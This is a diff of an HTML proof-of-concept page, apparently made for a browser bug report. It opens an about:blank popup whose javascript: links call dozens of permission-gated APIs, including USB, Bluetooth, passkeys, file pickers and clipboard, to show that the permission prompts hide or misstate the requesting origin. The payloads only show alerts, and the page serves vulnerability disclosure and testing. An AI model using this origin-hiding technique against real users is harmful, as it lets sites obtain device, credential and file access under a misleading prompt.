@@ -1,63 +1,242 @@
 <!DOCTYPE html>
-<html lang="id">
+<html lang="en">
 <head>
-<meta charset="utf-8">
-<title>PoC — Web Bluetooth Permission Origin (about:blank)</title>
-<style>
-  body { font-family: system-ui, sans-serif; margin: 24px; max-width: 760px; }
-  iframe { width: 100%; height: 180px; border: 2px dashed #999; margin-top: 12px; }
-  code { background: #eee; padding: 2px 6px; border-radius: 4px; }
-  .warn { background: #fff3cd; border-left: 4px solid #ffc107; padding: 12px; }
-</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PoC: Origin Spoofing in Permission Choosers via about:blank Popup</title>
+    <style>
+        body { font-family: -apple-system, Arial, sans-serif; padding: 20px; max-width: 1000px; margin: 0 auto; line-height: 1.5; }
+        button { padding: 10px 20px; font-size: 16px; cursor: pointer; background: #007bff; color: white; border: 0; border-radius: 4px; }
+        button:hover { background: #0056b3; }
+        .note { margin-top: 20px; padding: 12px; background: #ffeeee; border-left: 4px solid red; font-size: 14px; border-radius: 4px; }
+        .note.green { background: #eeffee; border-left-color: green; }
+        code { background: #eee; padding: 1px 5px; border-radius: 3px; font-family: monospace; }
+        h2 { margin-top: 0; }
+        ol { padding-left: 20px; }
+        li { margin: 4px 0; }
+    </style>
 </head>
 <body>
-  <h1>PoC — Web Bluetooth Permission Origin</h1>
+    <h2>PoC: Origin Spoofing in Permission Choosers via <code>about:blank</code> Popup</h2>
 
-  <div class="warn">
-    <strong>Ekspektasi:</strong> dialog permission Bluetooth menampilkan origin
-    halaman ini, yaitu <code id="origin1"></code>.<br>
-    <strong>Bug:</strong> dialog menampilkan <code>about:blank</code>.
-  </div>
+    <p>This PoC demonstrates that permission dialogs for a wide range of browser APIs <strong>do not display the correct requesting origin</strong> when invoked from an <code>about:blank</code> popup window.</p>
 
-  <p>Origin halaman ini: <code id="origin2"></code></p>
+    <p><strong>Expected (secure):</strong> every permission prompt displays the requesting origin (<code>https://your-domain.example</code>).</p>
+    <p><strong>Observed (vulnerable):</strong> many prompts show <em>no origin at all</em>, or show <code>about:blank</code> / <code>null</code> / <code>about:srcdoc</code>.</p>
 
-  <!-- Iframe TANPA atribut src → document.URL = "about:blank" -->
-  <iframe id="bt-frame" allow="bluetooth"></iframe>
+    <button onclick="openPopup()">▶ Open about:blank Popup</button>
 
-  <script>
-    const origin = location.origin;
-    document.getElementById('origin1').textContent = origin;
-    document.getElementById('origin2').textContent = origin;
+    <div class="note">
+        <strong>Steps:</strong>
+        <ol>
+            <li>Click the button to open the <code>about:blank</code> popup.</li>
+            <li>Click each 🔴 entry &mdash; inspect whether the permission chooser shows the origin or not.</li>
+            <li>Click each ✅ entry as baseline &mdash; those should correctly show the origin.</li>
+            <li>Click ℹ️ Diagnostic to see <code>location.href</code> vs <code>location.origin</code> inside the popup.</li>
+        </ol>
+        <strong>Requirements:</strong> Chromium-based browser, served over <strong>HTTPS</strong> or <code>localhost</code>.
+    </div>
 
-    const frame = document.getElementById('bt-frame');
+    <div class="note green">
+        <strong>Platform notes:</strong>
+        <code>NFC</code> &amp; <code>Contact Picker</code> &mdash; Android Chrome;
+        <code>Passkey</code> &mdash; needs platform authenticator (Windows Hello / Touch ID / Android biometric);
+        <code>USB/Serial/HID/Bluetooth/MIDI</code> &mdash; desktop Chromium;
+        <code>Idle Detection</code> &mdash; desktop Chrome;
+        <code>Orientation/Motion</code> &mdash; iOS Safari (prompts), desktop (no prompt).
+    </div>
 
-    // Tulis konten ke iframe about:blank (same-origin, mewarisi origin parent)
-    const doc = frame.contentDocument;
-    doc.open();
-    doc.write(`
-      <!DOCTYPE html>
-      <html>
-      <body style="font-family:system-ui;margin:12px">
-        <button id="btn">Request Bluetooth Device</button>
-        <pre id="out" style="white-space:pre-wrap"></pre>
-        <script>
-          const out = document.getElementById('out');
-          document.getElementById('btn').onclick = async () => {
-            out.textContent = 'Memanggil navigator.bluetooth.requestDevice()...';
-            try {
-              const d = await navigator.bluetooth.requestDevice({
-                acceptAllDevices: true
-              });
-              out.textContent = 'Device dipilih: ' + (d.name || d.id);
-            } catch (e) {
-              out.textContent = 'Error: ' + e.name + ' — ' + e.message;
-            }
-          };
-        <\/script>
-      </body>
-      </html>
-    `);
-    doc.close();
-  </script>
+    <script>
+    const escAttr = (s) => s.replace(/&/g, '&amp;').replace(/"/g, '&quot;');
+
+    const J = (body) =>
+        'javascript:(async()=>{' + body + '})().catch(e=>alert("Uncaught: "+e.name+": "+e.message))';
+
+    const T = (body) =>
+        J('try{' + body + '}catch(e){alert(e.name+": "+e.message)}');
+
+    // ================= VULNERABLE =================
+    const USB = T("const d=await navigator.usb.requestDevice({filters:[]});alert('OK: '+(d.productName||d.deviceName||d.serialNumber||'device'))");
+    const SERIAL = T("const p=await navigator.serial.requestPort({filters:[]});alert('OK: port')");
+    const HID = T("const d=await navigator.hid.requestDevice({filters:[]});alert('OK: '+d.length+' device(s)')");
+    const BLUETOOTH = T("const d=await navigator.bluetooth.requestDevice({acceptAllDevices:true});alert('OK: '+(d.name||d.id))");
+
+    const PASSKEY_CREATE = T(
+        "const ch=new Uint8Array(32);crypto.getRandomValues(ch);" +
+        "const uid=new Uint8Array(16);crypto.getRandomValues(uid);" +
+        "const c=await navigator.credentials.create({publicKey:{" +
+        "challenge:ch,rp:{name:'PoC',id:(location.hostname||undefined)}," +
+        "user:{id:uid,name:'poc@example.com',displayName:'PoC User'}," +
+        "pubKeyCredParams:[{type:'public-key',alg:-7},{type:'public-key',alg:-257}]," +
+        "authenticatorSelection:{authenticatorAttachment:'platform',userVerification:'required'}," +
+        "timeout:60000,attestation:'none'}});alert('OK: credential created')");
+
+    const PASSKEY_GET = T(
+        "const ch=new Uint8Array(32);crypto.getRandomValues(ch);" +
+        "const c=await navigator.credentials.get({publicKey:{challenge:ch,timeout:60000,userVerification:'required'}});" +
+        "alert('OK: credential retrieved')");
+
+    const PASSKEY_ATTEST = T(
+        "const ch=new Uint8Array(32);crypto.getRandomValues(ch);" +
+        "const uid=new Uint8Array(16);crypto.getRandomValues(uid);" +
+        "const c=await navigator.credentials.create({publicKey:{" +
+        "challenge:ch,rp:{name:'PoC',id:(location.hostname||undefined)}," +
+        "user:{id:uid,name:'attest@example.com',displayName:'Attest User'}," +
+        "pubKeyCredParams:[{type:'public-key',alg:-7}]," +
+        "authenticatorSelection:{authenticatorAttachment:'cross-platform',userVerification:'required'}," +
+        "timeout:60000,attestation:'direct'}});alert('OK: attestation created')");
+
+    const FS_OPEN = T("const f=await window.showOpenFilePicker();alert('OK: '+f.length+' file(s)')");
+    const FS_SAVE = T("const f=await window.showSaveFilePicker();alert('OK: '+f.name)");
+    const FS_DIR  = T("const d=await window.showDirectoryPicker();alert('OK: '+d.name)");
+
+    const MIDI       = T("const a=await navigator.requestMIDIAccess({sysex:false});alert('OK: in='+a.inputs.size+' out='+a.outputs.size)");
+    const MIDI_SYSEX = T("const a=await navigator.requestMIDIAccess({sysex:true});alert('OK: sysex granted')");
+
+    const NFC = T("if(!('NDEFReader' in window)){alert('NFC not supported');return}const r=new NDEFReader();await r.scan();alert('OK: NFC scan started')");
+
+    const VR = T("if(!navigator.xr){alert('WebXR not supported');return}const ok=await navigator.xr.isSessionSupported('immersive-vr');alert('VR supported: '+ok);if(ok){const s=await navigator.xr.requestSession('immersive-vr');await s.end();alert('OK: VR session')}");
+    const AR = T("if(!navigator.xr){alert('WebXR not supported');return}const ok=await navigator.xr.isSessionSupported('immersive-ar');alert('AR supported: '+ok);if(ok){const s=await navigator.xr.requestSession('immersive-ar');await s.end();alert('OK: AR session')}");
+
+    const IDLE = T("if(!('IdleDetector' in window)){alert('Idle Detection not supported');return}const d=new IdleDetector();const p=await d.requestPermission();alert('Permission: '+p);if(p==='granted'){await d.start({threshold:60000});alert('OK: idle started');d.stop()}");
+
+    const PERSIST = T("if(!navigator.storage||!navigator.storage.persist){alert('Not supported');return}const ok=await navigator.storage.persist();alert('Persistent: '+ok)");
+
+    const PROTOCOL = T("await navigator.registerProtocolHandler('web+poc',location.origin+'/?url=%s');alert('OK: protocol handler registered')");
+
+    const CONTACTS = T("if(!navigator.contacts){alert('Contact Picker not supported');return}const c=await navigator.contacts.select(['name','email','tel'],{multiple:true});alert('OK: '+c.length+' contact(s)')");
+
+    const PAYMENT = T("const req=new PaymentRequest([{supportedMethods:'https://google.com/pay'}],{total:{label:'Total',amount:{currency:'USD',value:'0.01'}}});const res=await req.show();alert('OK: payment resolved')");
+
+    const WAKE_LOCK = T("if(!navigator.wakeLock){alert('Wake Lock not supported');return}const l=await navigator.wakeLock.request('screen');alert('OK: wake lock acquired');await l.release()");
+
+    const EME = T("const cfg=[{initDataTypes:['cenc'],videoCapabilities:[{contentType:'video/mp4; codecs=\"avc1.42E01E\"'}]}];const a=await navigator.requestMediaKeySystemAccess('com.widevine.alpha',cfg);alert('OK: EME access to '+a.keySystem)");
+
+    const FULLSCREEN = T("await document.documentElement.requestFullscreen();alert('OK: fullscreen (press ESC to exit)')");
+
+    const POINTER_LOCK =
+        "javascript:(()=>{try{if(!document.body.requestPointerLock){alert('Pointer Lock not supported');return}" +
+        "document.body.requestPointerLock();alert('Pointer lock requested. Press ESC to release.')}" +
+        "catch(e){alert(e.name+': '+e.message)}})()";
+
+    const KEYBOARD_LOCK = T("if(!navigator.keyboard||!navigator.keyboard.lock){alert('Keyboard Lock not supported');return}await document.documentElement.requestFullscreen();await navigator.keyboard.lock(['KeyW','KeyA','KeyS','KeyD','Escape']);alert('OK: keyboard locked (fullscreen). Press & hold ESC to exit.');setTimeout(()=>document.exitFullscreen(),5000)");
+
+    // ================= SECURE (baseline) =================
+    const NOTIFICATIONS = T("const p=await Notification.requestPermission();alert('Permission: '+p);if(p==='granted')new Notification('PoC Notification',{body:'Origin should be visible in prompt'})");
+
+    const GEOLOCATION = "javascript:(()=>{navigator.geolocation.getCurrentPosition(p=>alert('OK: '+p.coords.latitude.toFixed(4)+', '+p.coords.longitude.toFixed(4)+' (±'+p.coords.accuracy+'m)'),e=>alert('Geo error: '+e.message),{enableHighAccuracy:true,timeout:60000,maximumAge:0})})()";
+    const GEO_APPROX  = "javascript:(()=>{navigator.geolocation.getCurrentPosition(p=>alert('OK: '+p.coords.latitude.toFixed(2)+', '+p.coords.longitude.toFixed(2)),e=>alert('Geo error: '+e.message),{enableHighAccuracy:false,timeout:60000,maximumAge:300000})})()";
+
+    const CAMERA = T("const s=await navigator.mediaDevices.getUserMedia({video:true});s.getTracks().forEach(t=>t.stop());alert('OK: camera')");
+    const MIC    = T("const s=await navigator.mediaDevices.getUserMedia({audio:true});s.getTracks().forEach(t=>t.stop());alert('OK: microphone')");
+    const CAM_MIC = T("const s=await navigator.mediaDevices.getUserMedia({video:true,audio:true});s.getTracks().forEach(t=>t.stop());alert('OK: camera+mic')");
+
+    const PTZ     = T("const s=await navigator.mediaDevices.getUserMedia({video:{pan:true,tilt:true,zoom:true}});s.getTracks().forEach(t=>t.stop());alert('OK: PTZ')");
+    const PTZ_MIC = T("const s=await navigator.mediaDevices.getUserMedia({video:{pan:true,tilt:true,zoom:true},audio:true});s.getTracks().forEach(t=>t.stop());alert('OK: PTZ+mic')");
+
+    const SCREEN = T("const s=await navigator.mediaDevices.getDisplayMedia({video:true});s.getTracks().forEach(t=>t.stop());alert('OK: screen share')");
+
+    const CLIP_READ  = T("const t=await navigator.clipboard.readText();alert('OK: read '+t.length+' chars')");
+    const CLIP_WRITE = T("await navigator.clipboard.writeText('PoC text');alert('OK: clipboard written')");
+
+    const CLIP_READ_DELAYED  = "javascript:(()=>{alert('Reading clipboard in 5s...');setTimeout(async()=>{try{const t=await navigator.clipboard.readText();alert('OK: read '+t.length+' chars')}catch(e){alert(e.name+': '+e.message)}},5000)})()";
+    const CLIP_WRITE_DELAYED = "javascript:(()=>{alert('Writing clipboard in 5s...');setTimeout(async()=>{try{await navigator.clipboard.writeText('PoC delayed text');alert('OK: written')}catch(e){alert(e.name+': '+e.message)}},5000)})()";
+
+    // ================= MISC =================
+    const COPY_OLD = "javascript:(()=>{const t=document.createElement('textarea');t.value='PoC text copied';document.body.appendChild(t);t.select();try{document.execCommand('copy')}catch(e){}document.body.removeChild(t);alert('Copy triggered (execCommand)')})()";
+
+    const AUTO_DOWNLOAD = "javascript:(()=>{const a=document.createElement('a');a.href='data:text/plain;charset=utf-8,PoC%20download';a.download='poc.txt';document.body.appendChild(a);a.click();document.body.removeChild(a);alert('Download triggered')})()";
+
+    const POPUP = "javascript:(()=>{const w=window.open('https://example.com','_blank','width=300,height=300');if(w)alert('Popup opened')})()";
+    const POPUP_DELAYED = "javascript:(()=>{alert('Popup will open in 5 seconds...');setTimeout(()=>{const w=window.open('https://example.com','_blank','width=300,height=300');if(w)alert('Delayed popup opened')},5000)})()";
+
+    const ORIENTATION = T("if(typeof DeviceOrientationEvent!=='undefined'&&DeviceOrientationEvent.requestPermission){const p=await DeviceOrientationEvent.requestPermission();alert('Orientation permission: '+p);if(p==='granted')window.addEventListener('deviceorientation',()=>{},false)}else{alert('No permission required (or unsupported)')}");
+    const MOTION = T("if(typeof DeviceMotionEvent!=='undefined'&&DeviceMotionEvent.requestPermission){const p=await DeviceMotionEvent.requestPermission();alert('Motion permission: '+p);if(p==='granted')window.addEventListener('devicemotion',()=>{},false)}else{alert('No permission required (or unsupported)')}");
+
+    const KEYGEN_MSG = "javascript:alert('keygen is deprecated and removed from browsers. Historical only.');void(0)";
+
+    const DIAG =
+        "javascript:(()=>{alert(" +
+        "'href: '+location.href+'\\n'+ " +
+        "'origin: '+location.origin+'\\n'+ " +
+        "'window.origin: '+(window.origin||'(undefined)')+'\\n'+ " +
+        "'hostname: '+location.hostname+'\\n'+ " +
+        "'referrer: '+(document.referrer||'(none)'))})()";
+
+    // ================= RENDER =================
+    function A(url, label, color) {
+        const c = color ? ' style="color:'+color+'"' : '';
+        return '<a href="'+escAttr(url)+'"'+c+'>'+label+'</a>';
+    }
+    function SEC(title, items, color) {
+        return '<div style="font-weight:bold;margin:14px 0 4px;color:#333;text-transform:uppercase;font-size:12px;letter-spacing:0.5px;">'+title+'</div>'
+             + '<div>' + items.map(([u,l]) => A(u,l,color)).join('') + '</div>';
+    }
+
+    function openPopup() {
+        const nw = window.open('about:blank', '_blank', 'width=880,height=1000');
+        if (!nw) { alert('Popup blocked. Please allow popups and retry.'); return; }
+
+        const html = '<!DOCTYPE html><html><head><meta charset="utf-8"><title>about:blank popup — PoC</title>'
+        + '<style>body{font-family:-apple-system,Arial,sans-serif;padding:16px;font-size:13px;line-height:1.5}'
+        + 'h3{margin:0 0 8px}a{display:block;margin:3px 0;text-decoration:none;color:#0066cc;padding:2px 4px;border-radius:3px}'
+        + 'a:hover{text-decoration:underline;background:#f0f8ff}code{background:#eee;padding:1px 4px;border-radius:3px}'
+        + 'hr{border:0;border-top:1px solid #ddd;margin:14px 0}</style></head><body>'
+        + '<h3>Popup Window &mdash; <code>about:blank</code></h3>'
+        + '<p style="font-size:12px;color:#666">Click each link and observe the permission chooser.</p>'
+
+        + SEC('🔴 Vulnerable (expected origin, observed missing / about:blank)', [
+            [USB,'🔴 USB'], [SERIAL,'🔴 Serial'], [HID,'🔴 HID'], [BLUETOOTH,'🔴 Bluetooth'],
+            [PASSKEY_CREATE,'🔴 WebAuthn — Create (Passkey)'],
+            [PASSKEY_GET,'🔴 WebAuthn — Get (Passkey)'],
+            [PASSKEY_ATTEST,'🔴 WebAuthn — Attestation (direct)'],
+            [FS_OPEN,'🔴 File System — Open File Picker'],
+            [FS_SAVE,'🔴 File System — Save File Picker'],
+            [FS_DIR,'🔴 File System — Directory Picker'],
+            [MIDI,'🔴 MIDI'], [MIDI_SYSEX,'🔴 MIDI + SysEx'], [NFC,'🔴 NFC'],
+            [VR,'🔴 Virtual Reality (immersive-vr)'],
+            [AR,'🔴 Augmented Reality (immersive-ar)'],
+            [IDLE,'🔴 Idle Detection'], [PERSIST,'🔴 Persistent Storage'],
+            [PROTOCOL,'🔴 Protocol Handler'], [CONTACTS,'🔴 Contact Picker'],
+            [PAYMENT,'🔴 Payment Request'], [WAKE_LOCK,'🔴 Wake Lock'],
+            [EME,'🔴 Encrypted Media (EME/Widevine)'],
+            [FULLSCREEN,'🔴 Fullscreen'], [POINTER_LOCK,'🔴 Pointer Lock'], [KEYBOARD_LOCK,'🔴 Keyboard Lock'],
+        ], '#c00')
+
+        + '<hr>'
+        + SEC('✅ Secure comparison (origin should be visible)', [
+            [NOTIFICATIONS,'✅ Notifications'],
+            [GEOLOCATION,'✅ Location (precise)'],
+            [GEO_APPROX,'✅ Location (approximate)'],
+            [CAMERA,'✅ Camera'], [MIC,'✅ Microphone'], [CAM_MIC,'✅ Camera + Microphone'],
+            [PTZ,'✅ Pan-Tilt-Zoom'], [PTZ_MIC,'✅ Pan-Tilt-Zoom + Microphone'],
+            [SCREEN,'✅ Screen Share'],
+            [CLIP_READ,'✅ Async Clipboard — Read text'],
+            [CLIP_WRITE,'✅ Async Clipboard — Write text'],
+            [CLIP_READ_DELAYED,'✅ Async Clipboard — Read text (delayed)'],
+            [CLIP_WRITE_DELAYED,'✅ Async Clipboard — Write text (delayed)'],
+        ])
+
+        + '<hr>'
+        + SEC('⚙️ Non-permission / Misc', [
+            [COPY_OLD,'Copy (execCommand)'], [AUTO_DOWNLOAD,'Auto Download'],
+            [POPUP,'Popup'], [POPUP_DELAYED,'Popup (delayed 5 seconds)'],
+            [ORIENTATION,'Device Orientation'], [MOTION,'Device Motion'],
+            [KEYGEN_MSG,'&lt;keygen&gt; (deprecated)'],
+        ])
+
+        + '<hr>'
+        + SEC('ℹ️ Diagnostic', [
+            [DIAG,'Show location.href / origin / window.origin / hostname / referrer'],
+        ])
+
+        + '</body></html>';
+
+        nw.document.open();
+        nw.document.write(html);
+        nw.document.close();
+        nw.focus();
+    }
+    </script>
 </body>
 </html>
